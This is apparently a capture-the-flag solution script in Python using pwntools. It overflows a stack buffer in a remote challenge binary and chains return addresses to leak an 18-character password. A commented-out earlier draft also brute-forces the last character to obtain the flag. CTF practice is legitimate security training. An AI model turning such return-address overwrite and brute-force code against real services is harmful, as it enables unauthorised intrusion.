# from pwn import *

# host = "10.213.0.102"
# port = "39183"
# context.arch = 'i386'
# context.log_level = 'info'

# milestone_prize_addr = 0x080492d6
# menu_addr = 0x080493d7

# p = remote(host, port)
# p.recvuntil(b"Enter 1 for marathon or 2 for cheat code: ")
# p.sendline(b"1")
# p.recvuntil(b"Some words before start?")

# payload = b"A" * 36 + b"B" * 4

# # Try calling milestone_prize MORE times (maybe some calls are getting skipped)
# for i in range(20):  # Call 20 times instead of 18
#     payload += p32(milestone_prize_addr)

# payload += p32(menu_addr)

# p.sendline(payload)

# # Collect password
# password_dict = {}
# full_output = b""

# while True:
#     try:
#         line = p.recvline(timeout=1)
#         full_output += line
#         print(line.decode(errors='ignore').strip())
        
#         if b"Km" in line and b":" in line:
#             km_num = int(line.split(b"Km ")[1].split(b":")[0])
#             char = chr(line.split(b": ")[1].strip()[0])
#             password_dict[km_num] = char
        
#         if b"Enter 1 for marathon" in line:
#             break
#     except:
#         break

# # Reconstruct password
# password = ""
# for i in range(18):
#     if i in password_dict:
#         password += password_dict[i]
#     else:
#         print(f"[!] WARNING: Missing Km {i}")

# print(f"\n[!] Password ({len(password_dict)}/18): {password}")

# # Check if we got all 18
# if len(password) >= 18:
#     p.sendline(b"2")
#     p.recvuntil(b"Enter password: ")
#     p.sendline(password.encode())
#     p.interactive()
# else:
#     print(f"[!] Only got {len(password)} characters, expected 18")
#     print(f"[!] Missing indices: {[i for i in range(18) if i not in password_dict]}")
    
#     # Try with what we have anyway
#     p.sendline(b"2")
#     p.recvuntil(b"Enter password: ")
    
#     # Pad with common characters or brute force the last char
#     print("[*] Trying to brute force last character...")
#     import string
    
#     for last_char in string.printable:
#         test_pass = password + last_char
#         p2 = remote(host, port)
#         p2.recvuntil(b"Enter 1 for marathon or 2 for cheat code: ")
#         p2.sendline(b"2")
#         p2.recvuntil(b"Enter password: ")
#         p2.sendline(test_pass.encode())
        
#         response = p2.recvall(timeout=1)
#         if b"CTF{" in response or len(response) > 10:
#             print(f"\n[!] FOUND IT! Last char: '{last_char}'")
#             print(f"[!] Full password: {test_pass}")
#             print(f"[!] FLAG: {response.decode()}")
#             break
#         p2.close()

# p.close()

HOST = "10.213.0.102"
PORT = 39263
from pwn import *

milestone_prize_ret = p32(0x080492d6)
menu_ret = p32(0x080493d7)

p = remote(HOST, PORT)
passw = ""
for i in range(18):
    payload = "1"
    p.sendline(payload)

    out = p.recvuntil("code:")

    payload = 0x2c * b'a' + milestone_prize_ret + menu_ret

    p.sendline(payload)
    #out = p.recvuntil(b'km:', drop = True)
    #out = p.recvuntil("km").decode().split('\n')

    out = p.recvuntil(b'prize?').decode().split('\n')[2].split()[2]
    passw += out


print(passw)

payload = b"2"
p.sendline(payload)
payload = passw
p.sendline(payload)

p.interactive()